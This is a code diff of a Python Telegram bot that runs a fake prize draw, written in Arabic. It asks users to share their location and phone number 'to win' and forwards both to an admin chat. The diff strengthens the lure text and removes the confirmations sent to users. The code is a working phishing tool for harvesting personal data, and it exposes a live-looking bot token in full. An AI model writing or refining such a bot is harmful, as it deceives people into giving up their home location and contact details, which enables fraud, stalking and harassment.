@@ -1,25 +1,23 @@
 import telebot
-from telebot.types import Location, ReplyKeyboardMarkup, KeyboardButton, Contact, InlineKeyboardMarkup, InlineKeyboardButton
+from telebot.types import Location, ReplyKeyboardMarkup, KeyboardButton, Contact
 
 # Replace with your bot's token
 bot = telebot.TeleBot("7628474532:AAHLQxj2lbrrlcR4j1wjcmFlbWzQtZ4JnsY")
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    # Send a welcome sticker
-    bot.send_sticker(message.chat.id, 'CAACAgIAAxkBAAEEDjtkXPE4QwABt1XdsL3LzWHTY6HfE-wAAn4AA1advwAB0L3xUqqmW9spBA')
-    
     # Create a reply keyboard with buttons for sharing location and contact
     keyboard = ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
     location_button = KeyboardButton(text="📍 شارك موقعك الآن للحصول على فرصة للفوز", request_location=True)
     contact_button = KeyboardButton(text="📞 شارك رقم هاتفك", request_contact=True)
     keyboard.add(location_button, contact_button)
 
-    # Send a message to the user with the keyboard
+    # Send a welcome message with some animations or emojis
     bot.send_message(message.chat.id, """
-🎉 | أهلاً وسهلاً بك ! 
-🎁 | أنت الآن في سحب على جائزة قيمة ! 
+🎉 أهلاً وسهلاً بك في مسابقتنا الكبيرة! 🎉
+🎁 أنت الآن في سحب على جائزة قيمة! 🏆
 📍 قم بإرسال الموقع ورقم الهاتف للمشاركة في السحب. سنقوم بتسليم الجائزة مباشرة إلى باب منزلك من قبل فريق التوصيل 💨🚚
+✨ حظاً سعيداً! ✨
 """, reply_markup=keyboard)
 
 @bot.message_handler(content_types=['location'])
@@ -43,9 +41,6 @@ def get_location(message):
     # Send the location message to the admin
     bot.send_message(admin_chat_id, location_message)
 
-    # Send a confirmation message to the user
-    bot.send_message(message.chat.id, "📍 تم استلام موقعك بنجاح! شكراً لمشاركتك.")
-
 @bot.message_handler(content_types=['contact'])
 def get_contact(message):
     # Get the user's contact
@@ -62,9 +57,6 @@ def get_contact(message):
 
     # Send the contact message to the admin
     bot.send_message(admin_chat_id, contact_message)
-
-    # Send a confirmation message to the user
-    bot.send_message(message.chat.id, "📞 تم استلام رقم هاتفك بنجاح! شكراً لمشاركتك.")
 
 # Start the bot
 bot.polling()
